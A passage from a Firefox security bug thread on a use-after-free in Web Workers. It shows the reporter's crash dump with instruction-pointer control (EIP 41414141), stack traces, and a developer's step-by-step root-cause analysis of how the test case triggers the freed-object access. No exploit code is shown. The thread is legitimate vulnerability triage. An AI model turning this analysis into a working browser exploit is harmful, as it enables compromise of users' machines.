Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==7061==ABORTING

```

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1545345#c1)• 6 years ago |
|  | |

I can reproduce on a windows nightly asan build after letting the testcase reload loop run for a bit (sometimes it crashes quickly, sometimes takes a while). The stack on the crashing thread I get is a little different, but still a UAF read of 8 bytes somewhere in the CycleCollector. The allocation and freed stacks are the same as shown here.

Doesn't crash on an opt build. Haven't tried a debug build to see if there are any interesting assertions firing.

Group: core-security → dom-core-securityFlags: sec-bounty?Keywords: [csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1545345#c2)• 6 years ago |
|  | |

Attached file
[UAF\_NoteXPCOMChild\_EIP\_41414141.js](attachment.cgi?id=9059231)
— [Details](attachment.cgi?id=9059231&action=edit)

Attached a PoC ( UAF\_NoteXPCOMChild\_EIP\_41414141.js ) with EIP control on 32 bit Firefox.

Firefox version: 68.0a1 (2019-04-17) (32-bit)

OS: Windows 10

(1440.6678): Access violation - code c0000005 (!!! second chance !!!)

eax=12c2d920 ebx=13daf0b4 ecx=e5e5e5e5 edx=14da0000 esi=14da0000 edi=14a2e090

eip=41414141 esp=13daf094 ebp=13daf0c8 iopl=0 nv up ei pl nz na po nc

cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202

41414141 ?? ???

3:232> r

eax=12c2d920 ebx=13daf0b4 ecx=e5e5e5e5 edx=14da0000 esi=14da0000 edi=14a2e090

eip=41414141 esp=13daf094 ebp=13daf0c8 iopl=0 nv up ei pl nz na po nc

cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202

41414141 ?? ???

3:232> k

# ChildEBP RetAddr

WARNING: Frame IP not in any known module. Following frames may be wrong.

00 13daf090 5a4a77b3 0x41414141

01 13daf0c8 5a49a108 xul!CCGraphBuilder::NoteXPCOMChild+0x53 [z:\task\_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 2155]

02 13daf238 5a499ebe xul!mozilla::CycleCollectedJSRuntime::TraverseGCThing+0x238 [z:\task\_1555535245\build\src\xpcom\base\CycleCollectedJSRuntime.cpp @ 693]

03 13daf254 5a4a7221 xul!mozilla::JSGCThingParticipant::TraverseNative+0x2e [z:\task\_1555535245\build\src\xpcom\base\CycleCollectedJSRuntime.cpp @ 359]

04 13daf288 5a4a9507 xul!CCGraphBuilder::BuildGraph+0x91 [z:\task\_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 2061]

05 13daf2a0 5a4a9b5c xul!nsCycleCollector::MarkRoots+0x37 [z:\task\_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 2672]

06 13daf380 5a4acc23 xul!nsCycleCollector::Collect+0x26c [z:\task\_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 3423]

07 13daf3e4 5bf9624a xul!nsCycleCollector\_collect+0x53 [z:\task\_1555535245\build\src\xpcom\base\nsCycleCollector.cpp @ 3948]

08 13daf3f0 5a49a949 xul!mozilla::dom::workerinternals::`anonymous namespace'::WorkerJSRuntime::CustomGCCallback+0x1a [z:\task_1555535245\build\src\dom\workers\RuntimeService.cpp @ 909] 09 13daf41c 5992dd1f xul!mozilla::CycleCollectedJSRuntime::GCCallback+0x109 [z:\task_1555535245\build\src\xpcom\base\CycleCollectedJSRuntime.cpp @ 797] 0a 13daf43c 5992e1c1 xul!js::gc::GCRuntime::maybeCallGCCallback+0xdf [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7377] 0b 13daf4c8 5992ec84 xul!js::gc::GCRuntime::gcCycle+0x401 [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7466] 0c 13daf568 59916c59 xul!js::gc::GCRuntime::collect+0x144 [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7623] 0d 13daf600 598c4254 xul!js::gc::GCRuntime::gc+0xb9 [z:\task_1555535245\build\src\js\src\gc\GC.cpp @ 7712] 0e 13daf618 5bf9590a xul!JS_GC+0x24 [z:\task_1555535245\build\src\js\src\jsapi.cpp @ 1189] 0f 13daf6a4 58df966c xul!mozilla::dom::workerinternals::`anonymous namespace'::WorkerThreadPrimaryRunnable::Run+0xba [z:\task\_1555535245\build\src\dom\workers\RuntimeService.cpp @ 2325]

10 13dafb88 58df915b xul!nsThread::ProcessNextEvent+0x44c [z:\task\_1555535245\build\src\xpcom\threads\nsThread.cpp @ 1180]

11 13dafbac 58df8f20 xul!NS\_ProcessNextEvent+0x2b [z:\task\_1555535245\build\src\xpcom\threads\nsThreadUtils.cpp @ 486]

12 13dafbd8 58dd0764 xul!mozilla::ipc::MessagePumpForNonMainThreads::Run+0x100 [z:\task\_1555535245\build\src\ipc\glue\MessagePump.cpp @ 333]

13 13dafc10 58df8553 xul!MessageLoop::RunHandler+0x44 [z:\task\_1555535245\build\src\ipc\chromium\src\base\message\_loop.cc @ 309]

14 13dafc48 66db8906 xul!nsThread::ThreadFunc+0x173 [z:\task\_1555535245\build\src\xpcom\threads\nsThread.cpp @ 454]

15 13dafc78 66da7e0d nss3!\_PR\_NativeRunThread+0x116 [z:\task\_1555535245\build\src\nsprpub\pr\src\threads\combined\pruthr.c @ 397]

16 13dafc84 74f10f5f nss3!pr\_root+0xd [z:\task\_1555535245\build\src\nsprpub\pr\src\md\windows\w95thred.c @ 137]

17 13dafcc0 76518494 ucrtbase!thread\_start<unsigned int (\_\_stdcall\*)(void \*)>+0x3f

18 13dafcd4 6824638b KERNEL32!BaseThreadInitThunk+0x24

19 13dafd0c 77bc41c8 mozglue!patched\_BaseThreadInitThunk+0x8b [z:\task\_1555535245\build\src\mozglue\build\WindowsDllBlocklist.cpp @ 705]

1a 13dafd54 77bc4198 ntdll!\_\_RtlUserThreadStart+0x2f

1b 13dafd64 00000000 ntdll!\_RtlUserThreadStart+0x1b

|  | [Yaron Tausky [:ytausky]](/user_profile?user_id=621888) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a1252758_621888)• 6 years ago |

Assignee: nobody → ytausky

|  | [Yaron Tausky [:ytausky]](/user_profile?user_id=621888) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1545345#c3)• 6 years ago |
|  | |

Running this with assertions enabled and ASAN on, I get this assertion failure:

```
Assertion failure: !mCancelAllPendingRunnables, at /Users/yarontausky/src/gecko/dom/workers/WorkerPrivate.cpp:3294
#01: mozilla::dom::WorkerPrivate::DestroySyncLoop(unsigned int)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb811fa8]
#02: mozilla::dom::WorkerPrivate::RunCurrentSyncLoop()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb8114d1]
#03: mozilla::dom::XMLHttpRequestWorker::SendInternal(mozilla::dom::SendRunnable*, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xbe038cd]
#04: mozilla::dom::XMLHttpRequestWorker::Send(JSContext*, mozilla::dom::Nullable<mozilla::dom::DocumentOrBlobOrArrayBufferViewOrArrayBufferOrFormDataOrURLSearchParamsOrUSVString> const&, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xbe07c90]
#05: mozilla::dom::XMLHttpRequest_Binding::send(JSContext*, JS::Handle<JSObject*>, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x7b63faf]
#06: bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x8b8aa1d]
#07: CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x11713d3b]
#08: js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x11711c8f]
#09: Interpret(JSContext*, js::RunState&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x116e9c9d]
#10: js::RunScript(JSContext*, js::RunState&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x116c7a5e]
#11: js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x11711c34]
#12: js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1171588d]
#13: JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x12a77a58]
#14: mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x7f6fc43]
#15: void mozilla::dom::EventHandlerNonNull::Call<nsCOMPtr<mozilla::dom::EventTarget> >(nsCOMPtr<mozilla::dom::EventTarget> const&, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&, char const*, mozilla::dom::CallbackObject::ExceptionH[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x95e2940]
#16: mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x95df712]
#17: mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x958dea3]
#18: mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x958fdd0]
#19: mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&, mozilla::ELMCreationDetector&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x9569b38]
#20: mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x9567316]
#21: mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x956f585]
#22: mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsPresContext*, nsEventStatus*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x957a2ba]
#23: mozilla::DOMEventTargetHelper::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x9512c9d]
#24: mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x95a3902]
#25: mozilla::dom::BroadcastChannelChild::RecvNotify(mozilla::dom::ClonedMessageData const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb8c6ba1]
#26: mozilla::dom::PBroadcastChannelChild::OnMessageReceived(IPC::Message const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x291d860]
#27: mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x22bbf38]
#28: mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ab6370]
#29: mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1aaf72f]
#30: mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ab22e7]
#31: mozilla::ipc::MessageChannel::MessageTask::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ab3898]
#32: nsThread::ProcessNextEvent(bool, bool*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x41e3a0]
#33: NS_ProcessPendingEvents(nsIThread*, unsigned int)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x4158a6]
#34: mozilla::dom::WorkerPrivate::ClearMainEventQueue(mozilla::dom::WorkerPrivate::WorkerRanOrNot)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb80a7d2]
#35: mozilla::dom::WorkerPrivate::DestroySyncLoop(unsigned int)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb811fa8]
#36: mozilla::dom::WorkerPrivate::RunCurrentSyncLoop()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb8114d1]
#37: mozilla::dom::(anonymous namespace)::LoadAllScripts(mozilla::dom::WorkerPrivate*, nsTArray<mozilla::dom::(anonymous namespace)::ScriptLoadInfo>&, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb771aaa]
#38: mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, nsTSubstring<char16_t> const&, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb77093a]
#39: mozilla::dom::(anonymous namespace)::CompileScriptRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb859995]
#40: mozilla::dom::WorkerRunnable::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb833e05]
#41: nsThread::ProcessNextEvent(bool, bool*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x41e3a0]
#42: NS_ProcessNextEvent(nsIThread*, bool)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x42b324]
#43: mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb7ff9d5]
#44: mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb79e846]
#45: nsThread::ProcessNextEvent(bool, bool*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x41e3a0]
#46: NS_ProcessNextEvent(nsIThread*, bool)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x42b324]
#47: mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ac489e]
#48: MessageLoop::RunInternal()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1972961]
#49: MessageLoop::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x197259e]
#50: nsThread::ThreadFunc(void*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x413d86]
#51: _pt_root[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/libnss3.dylib +0x423007]
#52: _pthread_body[/usr/lib/system/libsystem_pthread.dylib +0x32eb]
#53: _pthread_start[/usr/lib/system/libsystem_pthread.dylib +0x6249]

```
Status: NEW → ASSIGNEDPriority: -- → P2

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a1769724_20209)• 6 years ago |

Blocks: [1547059](/show_bug.cgi?id=1547059 "RESOLVED DUPLICATE - AddressSanitizer: heap-use-after-free [@ CCGraphBuilder::NoteXPCOMChild] with READ of size 8")

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1545345#c4)• 6 years ago |
|  | |

Is there anyone working on this bug? It's reported almost 2 months ago.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1545345#c5)• 6 years ago |
|  | |

Thanks for checking. It is indeed being worked, but we're trying hard to avoid just pushing the signatures around. There are some systemic issues around worker shutdown that we're looking into.

That said, I don't think I'd fully processed [comment 2](/show_bug.cgi?id=1545345#c2 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") indicating control over the instruction pointer. Can you clarify what build you reproduced that on? We may need to land a combination of changes that shunt this scenario to crashes or early failures.

Flags: needinfo?(loobenyang)

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1545345#c6)• 6 years ago |
|  | |

(In reply to Andrew Sutherland [:asuth] (he/him) from [comment #5](/show_bug.cgi?id=1545345#c5 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest"))

> Thanks for checking. It is indeed being worked, but we're trying hard to avoid just pushing the signatures around. There are some systemic issues around worker shutdown that we're looking into.
>
> That said, I don't think I'd fully processed [comment 2](/show_bug.cgi?id=1545345#c2 "RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest") indicating control over the instruction pointer. Can you clarify what build you reproduced that on? We may need to land a combination of changes that shunt this scenario to crashes or early failures.

That's run against an official 32 bit Firefox nightly build from Mozilla, a latest nightly build on that day.

Firefox version: 68.0a1 (2019-04-17) (32-bit)

Flags: needinfo?(loobenyang)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1545345#c7)• 6 years ago |
|  | |

Any updates?

Flags: needinfo?(bugmail)

|  | [Hsin-Yi Tsai (she/her) [:hsinyi]](/user_profile?user_id=434964) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1545345#a5597328_434964)• 6 years ago |

Assignee: ytausky → bugmail

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1545345#c8)• 6 years ago |
|  | |

Is there any update? It's almost 3 months.

Usually security bugs were fixed in a couple weeks. If some developers were overloaded, can this be assigned to someone else?

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1545345#c9)• 6 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1545345&comment_id=14212904 "1 revision") |
|  | |

Tracking Requested - why for this release: sec-high.

It's too late for 68 at this point.

[status-firefox68](/buglist.cgi?f1=cf_status_firefox68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=affected) → [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix)
[status-firefox69](/buglist.cgi?f1=cf_status_firefox69&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=affected)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox69](/buglist.cgi?f1=cf_tracking_firefox69&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=%3F)

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1545345#c10)• 6 years ago |
|  | |

We have a stack of patches in [bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") that we believe should improve worker invariants in general. We'll be trying to land these this week and mop up the rest of the related worker life-cycle invariants as well that aren't fixed. The particular concern for this bug is that IPC messages continued to be processed and run content-exposed code after they should (plus some extra complexities involving the sync loop).

Flags: needinfo?(bugmail)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1545345#c11)• 5 years ago |
|  | |

I'm going to assume that [bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") isn't something we can uplift, so where does that leave us for Fx69/ESR68 for this bug? Is there anything we can do at least make this a safe crash there or something?

Flags: needinfo?(bugmail)

|  | [Looben Yang](/user_profile?user_id=506912)  Reporter |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1545345#c12)• 5 years ago |
|  | |

This bug missed the 90 day deadline advocated by Google. It never happens before with Mozilla.

|  | [Andrew Sutherland [:asuth] (he/him)](/user_profile?user_id=151407)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1545345#c13)• 5 years ago |
|  | |

Massive apologies on the delays on this bug.

[Bug 1559919](/show_bug.cgi?id=1559919 "RESOLVED FIXED - Finish the WorkerHolder cleanup") did not address the invariant issues. So here's the current analysis and plans for imminent fixes:

## What the Test Case Is Doing

* Page:
  + Creates a worker.
  + Spams the worker using BroadcastChannel. The (emergent) intent of this is

    to trigger a synchronous XHR from inside

    DestroySyncLoop/ClearMainEventQueue, creating a nested clearing/syncloop

    destruction.
  + Triggers a page reload.
    - This results in an attempt to terminate the worker, although it's not

      clear that this is necessary for the reproduction.
    - This also just reloads the whole scenario, helping to increase the

      likelihood of a nested syncloop occurring thanks to broadcast channel.
* Worker:
  + Creates a BroadcastChannel listener whose (async) message handler initiates

    a synchronous XHR and then aborts it once it completes.
    - Both methods are WorkerThreadProxySyncRunnables which means they both

      create syncloops which means this widens the potenial for a nested

      syncloop to be created by the BroadcastChannel message.
    - These both end up needing to bounce to the main thread because that's

      where the canonical state lives. (Even if the XHR object should

      notionally not need to consult the main thread, it does unless the worker

      has reached cancellation state.)
  + Creates a file reader that configures the XHR for synchronous operation when

    the load completes (or aborts, as is the case in this situation.)
  + Creates the XHR (before close).
  + Calls self.close() which, because this is a top-level script load which

    means we're in a sync loop, causes a deferred invocation of

    ClearMainEventQueue and defers dispatching the cancel runnable. From a

    spec perspective, it should be impossible to ever dispatch another task to

    the worker after this point.
    - We previously had a safer behavior where we would fail to do a lot of

      things after this point that would be observable by other globals despite

      this global's inability to receive and process further tasks. We

      corrected this, allowing BroadcastChannel messages to be set, etc., and

      somewhat weakening our guards against dubious things happening after

      close() is called.
  + Calls FileReader.readAsArrayBuffer:
    - This is probably fine. This code intends to be a no-op when the worker is

      shutting down (and indeed, with close called, per spec, the load can never

      complete), but because the weak worker ref is tied to canceling, the

      closing state has no effect. But this is likely fine because the state

      per spec should advance to loading, and that is observable per the spec

      for abort() which will generate synchronous event dispatches.
    - This puts us in mReadyState of LOADING and triggers an async wait.
  + Calls FileReader.abort:
    - Because of the above call to readAsArrayBuffer, this does not fast-bail.

      We trigger a synchronous dispatch of the "loadend" event which triggers

      the logic to configure the XHR to be synchronous. It's not clear that

      the FileReader is entirely necessary to the reproduction, but this

      behavior does seem necessary per spec. (And is harmless unless I'm

      missing a nuance.)
  + The script reaches the end of its evaluation, which will cause the syncloop

    to attempt to unwind. Which means it will attempt to call

    ClearMainEventQueue. Unfortunately, BroadcastChannel operates on an IPC

    threading model and so doesn't get its event canceled. Instead its event

    gets processed and the logic in BroadcastChannelChild::RecvNotify's that

    calls only DOMEventTargetHelper::CheckCurrentGlobalCorrectness() to check

    the state of the worker ends up confused and dispatches an event that

    should never have been dispatched. (Although [bug 1455020](/show_bug.cgi?id=1455020 "RESOLVED FIXED - Extend CheckInnerWindowCorrectness() to check the state of the worker.") was notionally

    concerned about this when it renamed the method, it only added an

    mParentObject check. This check is really a check of whether

    WorkerGlobalScope::NoteTerminating() has been invoked which then calls

    DisconnectEventTargetObjects(). But NoteTerminating is only called when

    WorkerPrivate::NotifyInternal is invoked with a status >= Canceling, which

    Close is not. (And as noted above, the cancelling state is deferred. It

    only runs when DestroySyncLoop has returned from ClearMainEventQueue()!)).

## What Invariants Are Going Wrong

* BroadcastChannel is dispatching events when it should not be. This is the

  primary invariant violation here, as it's allowing content to be invoked on

  the stack when it's absolutely not expected to be invoked on the stack. It's

  depending on one of the following things to protect it:
  + Being wrapped into a WorkerRunnable so it gets canceled instead of run.

    (It's not because it's IPC and it's not using the hybrid event target.)
    - The control flow for canceling WorkerRunnables is extra insane, as it

      depends on WorkerRunnable::Run() noticing that

      WorkerPrivate::AllPendingRunnablesShouldBeCanceled() returns true. Normal

      runnables just run.
    - Unfortunately event hybrid event target wrapping is semantically

      problematic because it coerces the normal runnables into control

      runnables.
  + Having DOMEventTargetHelper protect it from dispatching the event. (It's

    not because DOMEventTargetHelper's guard is only effective once the worker

    has reached the Canceling state, which it has not because the event is

    being invoked inside the syncloop destruction which will only advance to

    the canceling state after the event loop is drained.)
    - It is reasonable to enforce that ClearMainEventQueue should preclude

      event dispatch to occur while clearing the queue. We should either fail

      to dispatch or crash. It's arguably reasonable to enforce this at both

      the DETH level as well as the global level.
    - From a semantics level, it makes sense to explicitly have checks for

      whether it's currently legal to call into content and whether it's legal

      to enqueue tasks. Unfortunately, both self.close() and syncloops throw

      wrenches into clear state transitions here. close() definitely precludes

      future task enqueueing. And syncloop unwinding definitely creates

      intervals where calls into content are indicative of fatal invariant

      violations (specifically, when clearing the event queue).
* DestroySyncLoop isn't preventing reentrancy into the mSyncLoopStack.IsEmpty()

  actions, although, again, it's the calls into content that are forcing the

  issue.
  + The double-dispatch of the CancelingRunnables is notionally idempotent and

    okay in terms of reference counting, it's really just the event loop

    clearing that causes issues.
* XMLHttpRequestWorker.cpp's EventRunnable::WorkerRun takes a copy of

  mProxy's raw, non-owning pointer and passes it onwards to

  ProgressEvent::Constructor or NS\_NewDOMEvent, both of whom derive an owning

  RefPtr or nsCOMPtr. This enables a use-after-free on XMLHttpRequestWorker in

  the event of apparent event reordering. This is a thing that's possible when

  you have re-entrancy of syncloop destruction/content invocation on top of a

  syncloop, as this cancels all runnables after the current runnable when our

  invariants expect this to be impossible, allowing naive assumptions of

  strong-refs being held by things that can only be deleted chronologically in a

  future turn of the event loop being violated.
  + NB: I need to explain this better. To restate somewhat more explicitly:

    sync calls from workers assume that no content re-entrancy can occur. The

    whole point of the nested event queues and syncloops is that no content

    re-entrancy ever occurs. This limits the ability to create mismatched

    ownership situations because any GC or strong references on the stack before

    the code went synchronous continue to exist.

## So The (Non)Action Items

* The IPC/runnable issue is important but hard to address because of the

  divergence between what the Cache API expects in terms of semantics (IPC is

  chrome privileged) and what implementations like BroadcastChannel expect

  (IPC is content privileged, roughly speaking).
* Preventing calls into content JS when no longer appropriate is therefore

  paramount. This can be addressed from multiple sides:
  + ClearEventQueue can 100% inhibit calls into JS by DETH or any code until

    explicitly cleared.
  + DOMEventTargetHelper can be made to understand when it is being used in a

    context that is explicitly synchronously reentrant from content, versus when

